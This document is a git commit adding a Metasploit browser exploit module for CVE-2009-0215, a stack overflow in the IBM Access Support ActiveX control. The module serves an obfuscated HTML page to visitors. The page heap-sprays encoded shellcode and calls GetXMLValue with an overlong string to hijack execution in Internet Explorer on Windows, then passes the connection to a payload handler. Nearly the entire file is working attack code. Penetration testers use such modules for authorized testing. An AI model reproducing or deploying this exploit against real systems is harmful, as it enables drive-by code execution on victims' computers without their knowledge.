fe463072d6c288ff48b9bb2f60a2884766a264b1
Mario Ceballos <mc@metasploit.com>
2009-06-01 11:19:06 +0000

    added exploit module ibmegath_getxmlvalue.rb
    git-svn-id: file:///home/svn/framework3/trunk@6609 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/exploits/windows/browser/ibmegath_getxmlvalue.rb
@@ -0,0 +1,121 @@
+###
+## This file is part of the Metasploit Framework and may be subject to
+## redistribution and commercial restrictions. Please see the Metasploit
+## Framework web site for more information on licensing and terms of use.
+## http://metasploit.com/projects/Framework/
+###
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+
+	include Msf::Exploit::Remote::HttpServer::HTML
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'           => 'IBM Access Support ActiveX Control Buffer Overflow',
+			'Description'    => %q{
+					This module exploits a stack overflow in IBM Access Support. When
+					sending an overly long string to the GetXMLValue() method of IbmEgath.dll
+					(3.20.284.0) an attacker may be able to execute arbitrary code. 
+			},
+			'License'        => MSF_LICENSE,
+			'Author'         => [ 'MC' ], 
+			'Version'        => '$Revision:$',
+			'References'     => 
+				[
+					[ 'CVE', '2009-0215' ],
+					[ 'BID', '34228' ],
+					[ 'OSVDB', '5958' ],
+				],
+			'DefaultOptions' =>
+				{
+					'EXITFUNC' => 'process',
+				},
+			'Payload'        =>
+				{
+					'Space'         => 1024,
+					'BadChars'      => "\x00",
+				},
+			'Platform'       => 'win',
+			'Targets'        =>
+				[
+					[ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => '' } ]	
+				],
+			'DisclosureDate' => 'Mar 24 2009',
+			'DefaultTarget'  => 0))
+	end
+
+	def autofilter
+		false
+	end
+
+	def check_dependencies
+		use_zlib
+	end
+
+	def on_request_uri(cli, request)
+		# Re-generate the payload.
+		return if ((p = regenerate_payload(cli)) == nil)
+
+		# Encode the shellcode.
+		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
+		
+		ret = Rex::Text.uri_encode(Metasm::Shellcode.assemble(Metasm::Ia32.new, "or cl,[edx]").encode_string * 2)
+
+		fill = rand_text_english(rand(12) + 1)
+
+		js = %Q|
+			try {
+				var evil_string = "";
+				var index;
+				var sumthang;
+				var vulnerable = new ActiveXObject('IbmEgath.IbmEgathCtl.1');
+				var my_unescape = unescape;
+				var shellcode = '#{shellcode}';
+				#{js_heap_spray}
+				sprayHeap(my_unescape(shellcode), 0x0a0a0a0a, 0x40000);
+				for (index = 0; index < 4024; index++) {
+					evil_string = evil_string + my_unescape('#{ret}');
+				}
+				vulnerable.RunEgatherer('#{fill}');
+				var sumthang = vulnerable.GetXMLValue('#{fill}.xml', evil_string);
+			} catch( e ) { window.location = 'about:blank' ; }
+		|
+
+		opts = {
+			'Strings' => true,
+			'Symbols' => {
+				'Variables' => [ 
+					'vulnerable',
+					'shellcode',
+					'my_unescape',
+					'index',
+					'evil_string',
+					'sumthang',
+				]
+			}
+		}
+		js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)
+		js.update_opts(js_heap_spray.opts)
+		js.obfuscate()
+		content = %Q|
+			<html>
+			<body>
+				<script><!--
+				#{js}
+				//</script>
+			</body>
+			</html>
+            |
+
+		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
+
+		# Transmit the response to the client
+		send_response_html(cli, content)
+		
+		# Handle the payload
+		handler(cli)
+	end
+
+end
